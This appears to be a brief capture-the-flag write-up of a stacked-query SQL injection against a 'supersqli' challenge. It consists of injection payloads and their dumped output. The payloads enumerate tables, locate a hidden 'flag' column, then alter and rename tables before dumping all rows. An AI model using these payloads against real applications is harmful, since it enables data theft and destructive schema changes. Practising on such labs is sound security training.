
>1';show tables;#

```
array(1) {
[0]=>
array(2) {
["id"]=>
string(1) "1"
["data"]=>
string(12) "Only red tea"
}
}
array(2) {
[0]=>
array(1) {
["Tables_in_supersqli"]=>
string(16) "1919810931114514"
}
[1]=>
array(1) {
["Tables_in_supersqli"]=>
string(5) "words"
}
}
```

>1';desc `1919810931114514`;#

```
array(1) {
[0]=>
array(2) {
["id"]=>
string(1) "1"
["data"]=>
string(12) "Only red tea"
}
}
array(1) {
[0]=>
array(6) {
["Field"]=>
string(4) "flag"
["Type"]=>
string(4) "text"
["Null"]=>
string(3) "YES"
["Key"]=>
string(0) ""
["Default"]=>
NULL
["Extra"]=>
string(0) ""
}
}
```

>1';ALTER table `1919810931114514` add column id int;#

增加列


>1';rename table `words` to `wordback`;rename table `1919810931114514` to words;#


>1' or 1=1;#